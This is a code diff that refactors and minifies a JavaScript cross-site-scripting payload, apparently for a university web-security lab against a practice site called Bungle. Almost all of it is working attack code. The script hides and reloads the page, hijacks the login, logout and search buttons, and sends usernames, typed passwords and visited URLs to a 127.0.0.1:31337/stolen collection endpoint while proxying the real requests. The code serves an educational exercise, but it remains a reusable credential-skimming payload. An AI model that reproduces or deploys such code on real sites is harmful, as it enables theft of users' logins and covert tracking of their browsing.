@@ -68,57 +68,61 @@ Then just add spying code and hide your suspicious URLs.
 
 // was getting 500 errors due to too large urls so used a minifier https://www.toptal.com/developers/javascript-minifier
 
-function payload(e){function t(e,t,l){let o="http://127.0.0.1:31337/stolen";o+="?event="+l;let r=document.getElementById("logged-in-user");switch(null!==r&&(o+="&user="+encodeURIComponent(r.innerText)),l){case"nav":o+="&url="+encodeURIComponent(e);var i=new XMLHttpRequest;i.open("GET",o),i.send(),n(e,t);return;case"login":o+="&user="+encodeURIComponent(document.getElementById("username").value),o+="&pass="+encodeURIComponent(document.getElementById("userpass").value);var i=new XMLHttpRequest;i.open("GET",o),i.send(),console.log($("#loginForm").serialize()),$.ajax({type:"POST",url:e,data:$("#loginForm").serialize(),success:function(e){n("./",t)}});return;case"logout":var i=new XMLHttpRequest;i.open("GET",o),i.send(),$.ajax({type:"POST",url:"./logout",data:$("#logoutForm").serialize(),success:function(l){n(e,t)}});return}}function n(e,n){$("html").hide(),$("html").load(e,function(){$("html").show(),document.forms[1]&&document.forms[1].setAttribute("onsubmit","return false;"),document.forms[2]&&document.forms[2].setAttribute("onsubmit","return false;"),document.getElementById("log-in-btn")&&document.getElementById("log-in-btn").parentElement.parentElement.setAttribute("id","loginForm"),document.getElementById("log-out-btn")&&document.getElementById("log-out-btn").parentElement.setAttribute("id","logoutForm"),document.getElementById("bungle-lnk").removeAttribute("href"),document.getElementById("bungle-lnk").setAttribute("style","cursor:pointer;"),document.getElementById("search-again-btn")&&(document.getElementById("search-again-btn").removeAttribute("href"),document.getElementById("search-again-btn").setAttribute("style","cursor:pointer;")),document.getElementById("search-btn")&&document.getElementById("search-btn").addEventListener("click",function(){t("./search?q="+encodeURIComponent(document.getElementById("query").value),n,"nav")}),document.getElementById("log-in-btn")&&document.getElementById("log-in-btn").addEventListener("click",function(){t("./login",n,"login")}),document.getElementById("new-account-btn")&&document.getElementById("new-account-btn").addEventListener("click",function(){t("./create",n,"login")}),document.getElementById("log-out-btn")&&document.getElementById("log-out-btn").addEventListener("click",function(){t("./",n,"logout")}),document.getElementById("bungle-lnk").addEventListener("click",function(){t("./",n,"nav")}),document.getElementById("search-again-btn")&&document.getElementById("search-again-btn").addEventListener("click",function(){t("./",n,"nav")})})}n("./",e)}
+function payload(t){function n(t){var n=new XMLHttpRequest;n.open("GET",t),n.send()}function e(t,n,e,r){$.ajax({type:"POST",url:t,data:$(n).serialize(),success:function(t){i(e,r)}})}function r(t){return encodeURIComponent(t)}function o(t){return document.getElementById(t)}function u(t,u,l){let s="http://127.0.0.1:31337/stolen";s+="?event="+l;let a=o("logged-in-user");switch(null!==a&&(s+="&user="+r(a.innerText)),l){case"nav":n(s+="&url="+r(t)),i(t,u);return;case"login":s+="&user="+r(o("username").value),n(s+="&pass="+r(o("userpass").value)),e(t,"#loginForm","./",u);return;case"logout":n(s),e("./logout","#logoutForm",t,u);return}}function i(t,n){$("html").hide(),$("html").load(t,function(){function t(t,n,e,r){o(t)&&o(t).addEventListener("click",function(){u(n,e,r)})}$("html").show(),document.forms[1]&&document.forms[1].setAttribute("onsubmit","return false;"),document.forms[2]&&document.forms[2].setAttribute("onsubmit","return false;"),o("log-in-btn")&&o("log-in-btn").parentElement.parentElement.setAttribute("id","loginForm"),o("log-out-btn")&&o("log-out-btn").parentElement.setAttribute("id","logoutForm"),o("bungle-lnk").removeAttribute("href"),o("bungle-lnk").setAttribute("style","cursor:pointer;"),o("search-again-btn")&&(o("search-again-btn").removeAttribute("href"),o("search-again-btn").setAttribute("style","cursor:pointer;")),o("search-btn")&&o("search-btn").addEventListener("click",function(){u("./search?q="+r(o("query").value),n,"nav")}),t("log-in-btn","./login",n,"login"),t("new-account-btn","./create",n,"login"),t("log-out-btn","./",n,"logout"),t("bungle-lnk","./",n,"nav"),t("search-again-btn","./",n,"nav")})}i("./",t)}
+
 
 function payloadTooBig(attacker) {
+
+    function reqOpenSend(url){
+        var req = new XMLHttpRequest();
+        req.open('GET', url);
+        req.send();
+    }
+
+    function postAjax(ajaxurl, formidhash, proxyurl, spying_url) {
+        $.ajax({
+            type: "POST",
+            url: ajaxurl,
+            data: $(formidhash).serialize(), // serializes the form's elements.
+            success: function(data)
+            {
+                proxy(proxyurl, spying_url);
+            }
+        });
+    }
+
+    function encodeURIComponentForMinify(comp) {
+        return encodeURIComponent(comp);
+    }
+
+    function documentGetElementByIdForMinify(id) {
+        return document.getElementById(id);
+    }
 
     function spyAndProxy(url, spying_url, type){
         let finalUrl = 'http://127.0.0.1:31337/stolen'; // using hardcoded instead of relying on passing...
         finalUrl += '?event=' + type;
-        let user = document.getElementById('logged-in-user');
+        let user = documentGetElementByIdForMinify('logged-in-user');
         if(user !== null)
         {
-            finalUrl += '&user=' + encodeURIComponent(user.innerText);
+            finalUrl += '&user=' + encodeURIComponentForMinify(user.innerText);
         }
         switch(type)
         {
             case 'nav':
-                finalUrl += '&url=' + encodeURIComponent(url);
-                var req = new XMLHttpRequest();
-                req.open('GET', finalUrl);
-                req.send();
+                finalUrl += '&url=' + encodeURIComponentForMinify(url);
+                reqOpenSend(finalUrl);
                 proxy(url, spying_url);
                 return;
             case 'login': // for this case url corresponds to the ./login or ./create, redirecting to the home page
-                finalUrl += '&user=' + encodeURIComponent(document.getElementById('username').value);
-                finalUrl += '&pass=' + encodeURIComponent(document.getElementById('userpass').value);
-                var req = new XMLHttpRequest();
-                req.open('GET', finalUrl);
-                req.send();
-                console.log($("#loginForm").serialize());
-                $.ajax({
-                    type: "POST",
-                    url: url,
-                    data: $("#loginForm").serialize(), // serializes the form's elements.
-                    success: function(data)
-                    {
-                        proxy('./', spying_url);
-                    }
-                });
+                finalUrl += '&user=' + encodeURIComponentForMinify(documentGetElementByIdForMinify('username').value);
+                finalUrl += '&pass=' + encodeURIComponentForMinify(documentGetElementByIdForMinify('userpass').value);
+                reqOpenSend(finalUrl);
+                postAjax(url, "#loginForm", './', spying_url);
                 return;
             case 'logout':
-                var req = new XMLHttpRequest();
-                req.open('GET', finalUrl);
-                req.send();
-                $.ajax({
-                    type: "POST",
-                    url: './logout',
-                    data: $("#logoutForm").serialize(), // serializes the form's elements.
-                    success: function(data)
-                    {
-                        proxy(url, spying_url);
-                    }
-                });
+                reqOpenSend(finalUrl);
+                postAjax('./logout', "#logoutForm", url, spying_url);
                 return;
         }
     }
@@ -141,64 +145,80 @@ function payloadTooBig(attacker) {
                 // have all forms except the defense level one do nothing on submit
                 if(document.forms[1]) {document.forms[1].setAttribute('onsubmit', 'return false;');}
                 if(document.forms[2]) {document.forms[2].setAttribute('onsubmit', 'return false;');}
-                if(document.getElementById('log-in-btn')) {document.getElementById('log-in-btn').parentElement.parentElement.setAttribute('id', 'loginForm');}
-                if(document.getElementById('log-out-btn')) {document.getElementById('log-out-btn').parentElement.setAttribute('id', 'logoutForm');}
+                if(documentGetElementByIdForMinify('log-in-btn')) {documentGetElementByIdForMinify('log-in-btn').parentElement.parentElement.setAttribute('id', 'loginForm');}
+                if(documentGetElementByIdForMinify('log-out-btn')) {documentGetElementByIdForMinify('log-out-btn').parentElement.setAttribute('id', 'logoutForm');}
 
                 // make buttons do nothing
-                document.getElementById('bungle-lnk').removeAttribute('href');
-                document.getElementById('bungle-lnk').setAttribute('style', 'cursor:pointer;'); // probably don't need
-                if(document.getElementById('search-again-btn')) {
-                    document.getElementById('search-again-btn').removeAttribute('href');
-                    document.getElementById('search-again-btn').setAttribute('style', 'cursor:pointer;'); // probably don't need
+                documentGetElementByIdForMinify('bungle-lnk').removeAttribute('href');
+                documentGetElementByIdForMinify('bungle-lnk').setAttribute('style', 'cursor:pointer;'); // probably don't need
+                if(documentGetElementByIdForMinify('search-again-btn')) {
+                    documentGetElementByIdForMinify('search-again-btn').removeAttribute('href');
+                    documentGetElementByIdForMinify('search-again-btn').setAttribute('style', 'cursor:pointer;'); // probably don't need
+                }
+
+                function listener_add(id, sapurl, sapsurl, sapt)
+                {
+                    if(documentGetElementByIdForMinify(id)) {documentGetElementByIdForMinify(id).addEventListener(
+                        'click', 
+                        function() {
+                            spyAndProxy(sapurl, sapsurl, sapt);
+                        }
+                    );}
                 }
 
                 // event listener for search button
-                if(document.getElementById('search-btn')) {document.getElementById('search-btn').addEventListener(
+                // can't use listener_add(...) because need to get query at time of button push
+                if(documentGetElementByIdForMinify('search-btn')) {documentGetElementByIdForMinify('search-btn').addEventListener(
                     'click', 
                     function() {
-                        spyAndProxy('./search?q=' + encodeURIComponent(document.getElementById("query").value), spying_url, 'nav');
+                        spyAndProxy('./search?q=' + encodeURIComponentForMinify(documentGetElementByIdForMinify("query").value), spying_url, 'nav');
                     }
                 );}
 
                 // event listener for login button
-                if(document.getElementById('log-in-btn')) {document.getElementById('log-in-btn').addEventListener(
-                    'click', 
-                    function() {
-                        spyAndProxy('./login', spying_url, 'login');
-                    }
-                );}
+                // if(document.getElementById('log-in-btn')) {document.getElementById('log-in-btn').addEventListener(
+                //     'click', 
+                //     function() {
+                //         spyAndProxy('./login', spying_url, 'login');
+                //     }
+                // );}
+                listener_add('log-in-btn', './login', spying_url, 'login');
 
                 // event listener for create button
-                if(document.getElementById('new-account-btn')) {document.getElementById('new-account-btn').addEventListener(
-                    'click', 
-                    function() {
-                        spyAndProxy('./create', spying_url, 'login');
-                    }
-                );}
+                // if(document.getElementById('new-account-btn')) {document.getElementById('new-account-btn').addEventListener(
+                //     'click', 
+                //     function() {
+                //         spyAndProxy('./create', spying_url, 'login');
+                //     }
+                // );}
+                listener_add('new-account-btn', './create', spying_url, 'login');
 
                 // event listener for logout
-                if(document.getElementById('log-out-btn')) {document.getElementById('log-out-btn').addEventListener(
-                    'click', 
-                    function() {
-                        spyAndProxy('./', spying_url, 'logout');
-                    }
-                );}
+                // if(document.getElementById('log-out-btn')) {document.getElementById('log-out-btn').addEventListener(
+                //     'click', 
+                //     function() {
+                //         spyAndProxy('./', spying_url, 'logout');
+                //     }
+                // );}
+                listener_add('log-out-btn', './', spying_url, 'logout');
 
                 // event listener for bungle logo link
-                document.getElementById('bungle-lnk').addEventListener(
-                    'click', 
-                    function() {
-                        spyAndProxy('./', spying_url, 'nav');
-                    }
-                );
+                // document.getElementById('bungle-lnk').addEventListener(
+                //     'click', 
+                //     function() {
+                //         spyAndProxy('./', spying_url, 'nav');
+                //     }
+                // );
+                listener_add('bungle-lnk', './', spying_url, 'nav');
 
                 // event listener for bungle search again link
-                if(document.getElementById('search-again-btn')) {document.getElementById('search-again-btn').addEventListener(
-                    'click', 
-                    function() {
-                        spyAndProxy('./', spying_url, 'nav');
-                    }
-                );}
+                // if(document.getElementById('search-again-btn')) {document.getElementById('search-again-btn').addEventListener(
+                //     'click', 
+                //     function() {
+                //         spyAndProxy('./', spying_url, 'nav');
+                //     }
+                // );}
+                listener_add('search-again-btn', './', spying_url, 'nav');
 
                 // TODO hide history and make sure that history hits the proxy as needed
                 // TODO make forward and backwards buttons work
